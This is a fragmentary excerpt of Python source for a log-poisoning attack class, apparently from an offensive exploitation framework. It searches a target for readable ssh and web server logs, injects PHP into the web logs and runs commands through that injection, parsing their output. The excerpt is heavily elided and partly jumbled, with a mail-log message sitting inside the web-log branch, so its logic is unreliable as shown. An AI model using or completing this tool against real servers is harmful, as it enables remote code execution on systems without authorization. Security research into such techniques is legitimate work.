...
class LogPoisoningTechnique(TechniqueBase):
    ...
    def __init__(self, **kwargs):
        ...
        self.log_signatures = {
            ...
            "ssh": ["sshd", "Failed password", "Accepted password", "authentication failure"],
                    ...
                    if log_type in self.log_signatures:
                        for signature in self.log_signatures[log_type]:
                            if signature in test_response:
                                logger.info(f"Found accessible {log_type} log file: {log_path}")
                                self.log_file = log_path
                                self.log_type = log_type
                                return True
                    
                    # If we got here but don't recognize the content, check for generic log content
                    if any(marker in test_response for marker in ["GET /", "POST /", "HTTP/1.", "Mozilla", "Chrome", "Safari"]):
                        logger.info(f"Found accessible log file (likely web server): {log_path}")
                        self.log_file = log_path
                        self.log_type = "web"
                        return True
    ...
    def exploit(self) -> bool:
        ...
        try:
            ...
            if self.log_type in ["apache", "httpd", "nginx", "web"]:
                ...
                logger.info("Mail log poisoning detected, but automatic exploitation not implemented")
                logger.info("Try manually sending an email with PHP code")
                return False
            else:
                # Try web poisoning as a fallback
                logger.info(f"No specific poisoning method for {self.log_type}, trying web method")
                return self._poison_web_log()
    ...
    def execute(self, command: str) -> str:
        ...
        try:
            ...
            if self.detection_string in response:
                ...
                output_match = re.search(f"{self.detection_string}(.*?)(PHP Warning|PHP Notice|<br>|$)", 
                                        response, re.DOTALL)
                if output_match:
